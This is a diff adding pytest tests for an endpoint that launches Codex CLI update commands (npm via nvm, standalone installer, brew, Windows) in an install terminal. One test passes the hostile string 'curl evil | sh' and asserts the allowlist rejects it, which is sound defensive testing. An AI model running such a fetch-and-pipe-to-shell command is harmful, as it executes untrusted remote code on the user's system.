@@ -2640,3 +2640,71 @@ def test_malformed_or_raising_guess_never_leaks_an_admission_slot(client, monkey
     finally:
         la._LOCAL_AUTH_FAILS.clear()
         la._LOCAL_AUTH_IN_FLIGHT.clear()
+
+
+class _UpdateHealth(_InstallHealth):
+    installed = True
+    install_hint = ''
+    update_reason = 'Codex CLI 0.153.0 is older than 0.157.0'
+
+    def __init__(self, hint):
+        self.update_hint = hint
+
+
+class _UpdateRuntime:
+    def __init__(self, hint):
+        self._hint = hint
+
+    def health_check(self):
+        return _UpdateHealth(self._hint)
+
+
+def _update_launch(monkeypatch, client, hint, *, platform='darwin', have=('curl', 'brew')):
+    from mc.blueprints import agent_routes as ar
+    calls = []
+    monkeypatch.setattr(ar._agent_runtime, 'get_runtime', lambda name: _UpdateRuntime(hint))
+    monkeypatch.setattr(ar.shutil, 'which', lambda name: '/x/' + name if name in have else None)
+    monkeypatch.setattr(ar.sys, 'platform', platform)
+    monkeypatch.setattr(ar, '_launch_install_terminal',
+                        lambda command: (calls.append(command) or 'sess-9', None))
+    body = client.post('/api/agent/provider/codex/install-launch',
+                       json={'update': True}).get_json()
+    return body, calls
+
+
+def test_install_launch_update_npm_install_sources_nvm_first(monkeypatch, client):
+    """Field data 2026-10-01: an nvm Node is only on PATH inside the install
+    terminal, so an npm-installed Codex is updated through that same command."""
+    from mc import agent_runtime as rt
+    body, calls = _update_launch(monkeypatch, client, rt.CODEX_UPDATE_COMMANDS['npm'], have=())
+    assert body['ok'] is True and body['prerequisite'] == 'npm'
+    assert calls[0].index('nvm.sh') < calls[0].index('npm install -g')
+
+
+def test_install_launch_update_standalone_reruns_its_installer_not_npm(monkeypatch, client):
+    """Keegan's Mac: standalone install (no nvm, no npm). Running npm over it
+    leaves two copies; the vendor's own install.sh is what updates it."""
+    from mc import agent_runtime as rt
+    cmd = rt.CODEX_UPDATE_COMMANDS['standalone']
+    body, calls = _update_launch(monkeypatch, client, cmd, have=('curl',))
+    assert body['ok'] is True and calls == [cmd]
+    assert 'npm' not in calls[0]
+
+
+def test_install_launch_update_brew_and_windows_and_refusals(monkeypatch, client):
+    from mc import agent_runtime as rt
+    C = rt.CODEX_UPDATE_COMMANDS
+    body, calls = _update_launch(monkeypatch, client, C['brew'], have=('brew',))
+    assert body['ok'] is True and calls == [C['brew']]
+    body, calls = _update_launch(monkeypatch, client, C['standalone-windows'],
+                                 platform='win32', have=())
+    assert body['ok'] is True and calls == [C['standalone-windows']]
+    # missing tool: refused with the reason, nothing launched, no command to type
+    body, calls = _update_launch(monkeypatch, client, C['standalone'], have=())
+    assert body['ok'] is False and 'curl' in body['error'] and calls == []
+    # anything outside the allowlist never reaches a terminal
+    body, calls = _update_launch(monkeypatch, client, 'curl evil | sh', have=('curl',))
+    assert body['ok'] is False and calls == []
+    # no hint (unknown install method): nothing launched
+    body, calls = _update_launch(monkeypatch, client, '', have=('curl',))
+    assert body['ok'] is False and calls == []
